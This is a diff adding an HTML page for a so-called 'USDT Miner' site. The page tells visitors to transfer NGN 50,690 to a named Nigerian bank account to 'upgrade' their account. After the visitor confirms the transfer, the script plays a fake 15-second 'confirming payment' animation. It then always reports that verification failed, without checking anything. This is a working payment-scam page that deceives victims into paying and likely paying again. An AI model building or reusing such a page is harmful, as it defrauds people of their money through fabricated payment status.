@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>USDT Miner</title>
+    <link rel="stylesheet" href="fontawesome-free-6.2.0-web/css/all.css">
+    <script src="https://kit.fontawesome.com/32bbba991c.js" crossorigin="anonymous"></script>
+    <script src="js.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,400;0,500;1,900&display=swap');
+        * {
+            padding: 0;
+            margin: 0;
+            font-family: 'Poppins', sans-serif;
+        }
+        .top {
+            width: 100%;
+            height: 39px; 
+            margin-top: 30px;
+            background: rgb(208, 206, 206);
+        }
+        .top p {
+            padding-top: 6px;
+            padding-left: 20px;
+        }
+        .amount {
+            width: 100%;
+            height: 120px;
+            background: #ffffff;
+        }
+        .amount h3  {
+            float: right;
+            position: relative;
+            bottom: -20px;
+            padding-right: 12px;
+        }
+        .amount  p {
+            float: right;
+            padding-right: 12px;
+        }
+        .amount img {
+            width: 100px;
+            position: relative;
+            top: -36px;
+        }
+        .tp  p {
+            text-align: center;
+        }
+        .box {
+            width: 95%;
+            height: fit-content;
+            margin: 0 auto;
+            border: 1px solid grey;
+            background: #f5f2f2;
+        }
+        .box h3, p {
+            padding-left: 15px;
+        }
+        .copy-button {
+            float: right;
+            margin-right: 15px;
+            background-color: orange;
+            color: white;
+            border: none;
+            cursor: pointer;
+            position: relative;
+            top: -20px;
+            width: 50px;
+        }
+        .btn button {
+            width: 89%;
+            height: 39px;
+            margin:  0 auto;
+            display: block;
+            border: none;
+            background: orange;
+        }
+        #spinner, #transferCompleteMessage {
+            text-align: center;
+            font-size: 20px;
+            display: none;
+            margin-top: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid orange;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin .7s linear infinite;
+            margin: 0 auto;
+            margin-top: 20px;
+        }
+        .bc {
+            width: 90%;
+            height: 50px;
+            margin: 0 auto;
+            border: 1px solid rgb(233, 232, 232);
+            background: #f2f2f2;
+        }
+        .bb i {
+            width: 25px;
+            height: 25  px;
+            clip-path: circle();
+            color: green;
+            float: right;
+            position: relative;
+            left: -20px;
+            top: 12px;
+        }
+        .spinners {
+            width: 20px;
+            height: 20px;
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-top: 8px solid orange;
+            border-radius: 50%;
+            animation: spin .2s linear infinite;
+            margin: 50px auto;
+            float: right;
+            position: relative;
+            top: -39px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @media screen and (max-width: 768px) {
+            .top {
+        width: 100%;
+        height: 39px; 
+        margin-top: 30px;
+        background: rgb(208, 206, 206);
+        }
+        .top p {
+            padding-top: 6px;
+            padding-left: 20px;
+        }
+        .amount {
+            width: 100%;
+            height: 120px;
+            background: #ffffff;
+        }
+        .amount h3  {
+            float: right;
+            position: relative;
+            bottom: -20px;
+            padding-right: 12px;
+            font-size: 15px;
+        }
+        .amount  p {
+            float: right;
+            padding-right: 12px;
+            font-size: 18px;
+        }
+        .amount img {
+            width: 80px;
+            position: relative;
+            top: -45px;
+        }
+        .tp  p {
+            text-align: center;
+            font-size: 15px;
+        }
+        .box {
+            width: 90%;
+            height: fit-content;
+            margin: 0 auto;
+            border: 1px solid grey;
+            background: #f5f2f2;
+        }
+        .box h3, p {
+            padding-left: 15px;
+            font-size: 13px;
+        }
+        .copy-button {
+            float: right;
+            margin-right: 15px;
+            background-color: orange;
+            color: white;
+            border: none;
+            cursor: pointer;
+            position: relative;
+            top: -20px;
+            width: 40px;
+        }
+        .btn button {
+            width: 89%;
+            height: 39px;
+            margin:  0 auto;
+            display: block;
+            border: none;
+            background: orange;
+        }
+        #spinner, #transferCompleteMessage {
+            text-align: center;
+            font-size: 20px;
+            display: none;
+            margin-top: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid orange;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin .7s linear infinite;
+            margin: 0 auto;
+            margin-top: 20px;
+        }
+        g { color: green;
+
+
+        }
+        .bc {
+            width: 90%;
+            height: 50px;
+            margin: 0 auto;
+            border: 1px solid rgb(233, 232, 232);
+            background: #f2f2f2;
+        }
+        .bb i {
+            width: 25px;
+            height: 25  px;
+            clip-path: circle();
+            color: green;
+            float: right;
+            position: relative;
+            left: -20px;
+            top: 12px;
+        }
+        .spinners {
+            width: 20px;
+            height: 20px;
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-top: 8px solid orange;
+            border-radius: 50%;
+            animation: spin .2s linear infinite;
+            margin: 50px auto;
+            float: right;
+            position: relative;
+            top: -39px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        }
+        h4{
+            color: orange;
+        }
+        .password {
+            width: 300px;
+            margin: 15px auto;
+            position: relative;
+        }
+        #password-input {
+            width: 100%;
+            padding: 5px 0;
+            height: 30px;
+            line-height: 40px;
+            text-indent: 10px;
+            margin: 0 0 15px 0;
+            border-radius: 5px;
+            border: 1px solid #999;
+            font-size: 18px;
+        }
+        .password-control {
+            position: absolute;
+            top: 11px;
+            right: 6px;
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            background: url(https://snipp.ru/demo/495/view.svg) 0 0 no-repeat;
+        }
+        .password-control.view {
+            background: url(https://snipp.ru/demo/495/no-view.svg) 0 0 no-repeat;
+        }
+    </style>
+</head>
+<body>
+    <div class="top">
+        <p>Bank Transfer <span style="float: right; padding-right: 10px; color: red;">Cancel</span></p>
+    </div>
+    <div class="amount">
+        <h3>NGN <span>50,690.00</span> <span style="width: 100px; height: 13px; background: #000;"></span></h3>
+        <br> <br>
+        <P style="font-size: 11px;" id="email"></P>
+        <img src="https://fv5-4.failiem.lv/thumb_show.php?i=mbbxxephvn&view&v=1" alt="">  <br> <br>
+    </div>
+    <div class="tp">
+        <p >Proceed to your bank app to complete this Transfer</p>
+    </div> <br>
+    <div id="spinner" style="display: none;">
+        <div class="spinner" style="font-size: 13px;"></div>
+    <p> Wait while we confirm your payment... </p><br> <br>
+        <div class="bc">
+        <p style="float: left; font-size: 13px; padding-top: 12px;"> Payment Made <div class="bb"><i class="fa-solid fa-circle-check"></i></div></p>
+        </div> <br>
+        <div class="bc">
+            <p style="float: left; font-size: 13px; padding-top: 12px;">Confirming Payment <div class="spinners"></div></p>
+            
+        </div>
+    </div>
+    <div id="transferCompleteMessage" style="display: none;"><img src="data:image/png;base64,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">
+    <p style="font-size: 13px;"><h4>Transaction verification failed!</h4> </p><br><p>Your payment could not be completed. Reason: Unable to validate account/Transaction has not been made by you</p></div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    </p> <a style="font-size: 13px;" href="mailto:payperclicck@gmail.com"></a> <br>
+    </div>
+    <div class="box"> <br>
+        <p>Amount</p>
+        <h3 >NGN  <span id="amountToCopy">50,690.00</span> </h3>
+        <button class="copy-button" onclick="copyText('amountToCopy')">Copy</button>
+        <br>
+        <p>Account Number</p>
+        <h3 id="accountNumberToCopy">6629451703</h3>
+        <button class="copy-button" onclick="copyText('accountNumberToCopy')">Copy</button>
+        <br>
+        <p>Bank Name</p>
+        <h3>Moniepoint MFB</h3> <br>
+        <p>Account Name</p>
+        <h3>FCC UNIQUE BIZ CONCEPT</h3> <br> <hr> <br>
+        <p>Pay to this specific amount to upgrade your account </p> <br>
+        <div class="btn">
+            <button id="transferButton" onclick="startTransfer()">I have made this bank Transfer</button> <br>
+        </div>
+    </div> <br>
+    <script>
+        function copyText(elementId) {
+            var textToCopy = document.getElementById(elementId).textContent;
+            var dummyElement = document.createElement("textarea");
+            document.body.appendChild(dummyElement);
+            dummyElement.value = textToCopy;
+            dummyElement.select();
+            document.execCommand("copy");
+            document.body.removeChild(dummyElement);
+            alert("Copied: " + textToCopy);
+        }
+        function startTransfer() {
+            const box = document.querySelector('.box');
+            box.style.display = 'none';
+            const spinner = document.getElementById('spinner');
+            spinner.style.display = 'block';
+            setTimeout(function () {
+                spinner.style.display = 'none';
+                const transferCompleteMessage = document.getElementById('transferCompleteMessage');
+                transferCompleteMessage.style.display = 'block';
+            }, 15000);
+        }
+        function parseQueryParameters() {
+            const queryParams = new URLSearchParams(window.location.search);
+            const fullName = queryParams.get('fullName');
+            const email = localStorage.getItem('email');
+            return { fullName, email };
+        }
+        const { fullName, email } = parseQueryParameters();
+        document.getElementById('email').textContent = email;
+    </script>
+    <script>
+        $('body').on('click', '.password-control', function(){
+            if ($('#password-input').attr('type') == 'password'){
+                $(this).addClass('view');
+                $('#password-input').attr('type', 'text');
+            } else {
+                $(this).removeClass('view');
+                $('#password-input').attr('type', 'password');
+            }
+            return false;
+        });
+    </script>
+</body>
+</html>
